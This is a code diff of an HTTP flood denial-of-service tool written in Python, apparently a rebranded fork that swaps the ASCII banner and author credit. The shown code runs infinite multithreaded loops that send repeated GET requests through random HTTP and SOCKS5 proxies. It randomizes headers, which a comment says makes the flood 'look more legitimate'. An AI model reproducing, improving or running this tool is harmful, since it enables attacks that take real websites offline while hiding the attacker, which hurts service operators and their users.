@@ -8,22 +8,24 @@ import re
 from concurrent.futures import ThreadPoolExecutor
 import sys
 
+red = "\033[1;91m"
+green = "\033[1;92m"
+white = "\033[1;97m"
+orange = "\033[1;31m"
+end = "\033[1;92m"
 
-print('''
+design = f"{orange}█████{white}█████{green}█████{end}"
 
+print(f'''
+{green}
+    88""Yb 88""Yb 888888 8888b.     db    888888  dP"Yb  88""Yb 
+    88__dP 88__dP 88__    8I  Yb   dPYb     88   dP   Yb 88__dP 
+    88"""  88"Yb  88""    8I  dY  dP__Yb    88   Yb   dP 88"Yb  
+    88     88  Yb 888888 8888Y"  dP""""Yb   88    YbodP  88  Yb 
 
-  hh   hh  iii  bbbbbbb  eeeeeee  rrrrrrrr  nn     nnn  eeeeeee  ttttttttt
-  hh   hh  iii  bb   bb  eeeeeee  rr    rr  nnn    nnn  eeeeeee     ttt
-  hh   hh  iii  bb   bb  ee       rr    rr  nnnn   nnn  ee          ttt
-  hh   hh  iii  bbbbbbb  ee       rrrrrrrr  nnnnnnnnnn  ee          ttt
-  hhhhhhh  iii  bb       eeeeeee  rrrr      nnnnnnnnnn  eeeeeee     ttt
-  hh   hh  iii  bbbbbbb  ee       rr rr     nnnnnnnnnn  ee          ttt
-  hh   hh  iii  bb   bb  ee       rr  rr    nn  nnnnnn  ee          ttt
-  hh   hh  iii  bb   bb  eeeeeee  rr   rr   nnn  nnnnn  eeeeeee     ttt
-  hh   hh  iii  bbbbbbb  eeeeeee  rr    rr  nnnn  nnnn  eeeeeee     ttt
+    {design * 4}
 
-
-							C0d3d by All3xJ
+							C0d3d by Zaeem20
 	''')  # The graphics are there
 
 
@@ -41,9 +43,7 @@ socks5_proxy = requests.get(
 
 
 
-green = "\033[1;92m"
-red = "\033[1;91m"
-end = "\033[1;92m"
+
 
 
 def Main_Menu():  # in This Function Septum The Url To Make It Usable For The FutureSetting Of HttpRequests
@@ -151,7 +151,6 @@ def start_attack():
     try:
         global acceptall
         global connection
-        global count
 
         acceptall = [
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -171,16 +170,15 @@ def start_attack():
             "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
         ] # Header Accept at random to make the requests look more legitimate
         # the Keep Alive always is useful to LOL
-        connection = "Connection: Keep-Alive\r\n"
-        count = 0  #ThanksTherunixx,MyFriend
+        connection = "Connection: Keep-Alive\r\n"  #ThanksTherunixx,MyFriend
 
         ThreadPool = ThreadPoolExecutor(max_workers=threads)
         if use_proxy: # If we have chosen the proxying mode
             if proxy_mode: # And we chose the HTTP Proxy
                 with ThreadPool as executor:
                     for i in range(threads):
-                        executor.submit(RequestProxyHTTP(i+1).launch) # Start the special class                    
-                    # This starts threads as soon as they are all ready
+                        executor.submit(RequestProxyHTTP(i+1).launch) # Start the special class                   
+                        # This starts threads as soon as they are all ready
                     print(f"{ThreadPool._max_workers} Threads initialized")
                 # for i in range(threads):
                 #     threads_init[i].start() 
@@ -221,15 +219,9 @@ class RequestProxyHTTP:  #The Multithreading class
         else:
             get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
         request = get_host + useragent + accept + forward + connection + "\r\n" # Here is the Final Request
-        current = count  # To give the ID to the thread
-        # If the thread ID can be associated with a proxy, use that proxy
-
-        if current < len(anonymity):
-            proxy = anonymity[current].strip().split(':')
-        else:  # otherwise it takes it in random
-            proxy = random.choice(anonymity).strip().split(":")
         # wait for threads to be ready
         while True:  # infinite loop
+            proxy = random.choice(anonymity).strip().split(":")
             try:
                 # Here is our socket
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -238,13 +230,13 @@ class RequestProxyHTTP:  #The Multithreading class
                 #Encode In Bytes Della Richiest a HTTP
                 s.send(str.encode(request))
                 # Print of requests
-                print(f"Request sent from {proxy[0]}:{proxy[1]} >> {self.counter}\n")
-                current += 1
+                print(f"Request sent from {proxy[0]}:{proxy[1]} >> {self.counter}")
+                # current+=1
                 try:  # Send other requests in the same thread
                     for y in range(multiple):  # multiplication factor
                         # encode In Bytes DellaRichiest a HTTPtaHttp
                         s.send(str.encode(request))
-                        current+=y
+                        # current+=y
                 except:  # If something goes wrong, closes the socket and the cycle starts again
                     s.close()
             except:
@@ -264,15 +256,10 @@ class RequestSocksHTTP:# The Multithreading class
         else:
             get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
         request = get_host + useragent + accept + \
-            connection + "\r\n" # Final Request Composition
-        current = count # To give the ID to the thread
-        # If the thread ID can be associated with a proxy, use that proxy
-        if current < len(anonymity):
-            proxy = anonymity[current].strip().split(':')
-        else:  # otherwise it takes it in random
-            proxy = random.choice(anonymity).strip().split(":")
+            connection + "\r\n" # Final Request Composition      
         # wait for threads to be ready
         while True:
+            proxy = random.choice(anonymity).strip().split(":")
             try:
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(
                     proxy[1]), True)  # Command to Proxat us with the SOCKS
@@ -281,12 +268,10 @@ class RequestSocksHTTP:# The Multithreading class
                 s.send(str.encode(request)) # Send
                 #PrintReq +Counter
                 print(f"\nRequest sent from {proxy[0]+':'+proxy[1]} >> {self.counter}")
-                current+=1
                 try:  #Send other requests in the same thread
                     for y in range(multiple): # Multiplication factor
                         # Encode in bytes of the HTTP request
                         s.send(str.encode(request))
-                        current+=y
                 except:  # If something goes wrong, closes the socket and the cycle starts again
                     s.close()
             except: # If something goes wrong, this Except closes the socket and connects to the Try below
@@ -300,12 +285,10 @@ class RequestSocksHTTP:# The Multithreading class
                     # print req + counter
                     print("Request sent from " +
                             str(proxy[0]+":"+proxy[1]) + " @", self.counter)
-                    current += 1
                     try: # Send other requests in the same thread
                         for y in range(multiple):# Multiplication factor
                             # encode in bytes della richiesta HTTP
                             s.send(str.encode(request))
-                            current+=y
                     except:  # If something goes wrong, closes the socket and the cycle starts again
                         s.close()
                 except:
